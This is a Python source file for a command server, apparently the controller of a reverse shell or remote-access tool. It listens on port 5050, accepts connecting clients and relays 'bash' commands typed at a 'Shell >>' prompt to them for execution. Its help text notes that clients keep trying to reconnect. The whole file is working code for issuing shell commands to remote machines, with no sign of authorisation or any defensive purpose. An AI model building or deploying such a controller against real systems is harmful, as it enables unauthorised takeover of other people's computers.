import socket 
import threading, os, time

HEADER = 64
PORT = 5050
SERVER = '192.168.0.74'

ADDR = (SERVER, PORT)

FORMAT = 'utf-8'
DISCONNECT_MESSAGE = "!DISCONNECT"


#Collor
os.system('color')
RED = "\x1B[31;40m"
RESET = "\x1B[0m"

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    
    
print(f'{bcolors.WARNING}[CHECKING PORT] checking if port is open')
try:
  server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  server.bind(ADDR)
except Exception as e:
    print(f'{bcolors.FAIL}[ERROR] {e} {bcolors.ENDC}')
    print(f'{bcolors.HEADER}Press ENTER to close {bcolors.ENDC}')
    input()
    exit()
    

def handle_client(conn, addr):
    global timeout
    print('\n')
    print(f"{bcolors.OKGREEN}[NEW CONNECTION] {addr} connected.{bcolors.ENDC}")
    print()
    print('Shell >>')

    connected = True
    while connected:
        msg_length = conn.recv(HEADER).decode(FORMAT)
        if msg_length:
            try:
              msg_length = int(msg_length)
            except Exception as e:
                try:
                    msg_length = int(msg_length)
                except:
                    continue
                print(e)
                
              
            msg = conn.recv(msg_length).decode(FORMAT)
            if msg == DISCONNECT_MESSAGE:
                connected = False

            print(f"{bcolors.OKCYAN}[{addr}] {bcolors.ENDC}{msg}")
            timeout = False
            #conn.send("Msg received".encode(FORMAT))
    conn.close()
        

def start():
    server.listen()
    print(f"{bcolors.WARNING}[LISTENING] Server is listening on {SERVER}{bcolors.ENDC}")
    while True:
        global conn
        conn, addr = server.accept()
        thread = threading.Thread(target=handle_client, args=(conn, addr))
        thread.start()
        
        
        
        print(f"[ACTIVE CONNECTIONS] {threading.active_count() - 2}")

def commands():
    global timeout
    time.sleep(1)
    timeout = False
    while True:
      while timeout == True:
          time.sleep(0.1)
      
      print(RESET)
      cmd = input('Shell >>')
      
      timeout = True
      
          
      if cmd == 'help':
          print('[=================HELP=================]')
          print()
          print('Commands: ')
          print('   help - displays this message')
          print('   bash - runs bash/ terminal commands on client')
          print('   clear - clears terminal')
          print('   exit - closes the server (client will try to reconnect)')
          
          timeout = False
          
      elif cmd.startswith('bash'):
          cmd2 = cmd.removeprefix('bash ')
          conn.send(cmd.removeprefix('bash ').encode(FORMAT))
          time.sleep(0.5)
          if  cmd2 == 'clear':
            print(f"{bcolors.WARNING}[LISTENING] Server is listening on {SERVER}{bcolors.ENDC}") 
            print(f"[ACTIVE CONNECTIONS] {threading.active_count() - 2}")
            print('Shell >>')
      elif cmd == 'clear':
          try:
           os.system('clear')
           print(f"{bcolors.WARNING}[LISTENING] Server is listening on {SERVER}{bcolors.ENDC}") 
           print(f"[ACTIVE CONNECTIONS] {threading.active_count() - 2}")
          except:
          
            try:
             os.system('CLS')
             print(f"{bcolors.WARNING}[LISTENING] Server is listening on {SERVER}{bcolors.ENDC}") 
             print(f"[ACTIVE CONNECTIONS] {threading.active_count() - 2}")
            except:
             print(f'{bcolors.FAIL}[ERROR] cannot clear terminal{bcolors.ENDC}')
          
          
          timeout = False
      elif cmd == 'exit':
        timeout = False
        exit()
          
      else:
          print(RED + '[ERROR] Command not found' + RESET)
          print('type help to see avalible commands')
          timeout = False
        

print(f"{bcolors.WARNING}[STARTING] Server is starting...{bcolors.ENDC}")
time.sleep(0.5)
print(f"{bcolors.OKGREEN}[STARTED] Server has started{bcolors.ENDC}")
print(f'{bcolors.WARNING}[OPENING PROMPT] Spening command prompt{bcolors.ENDC}')
thread2 = threading.Thread(target=commands)
thread2.start()

start()
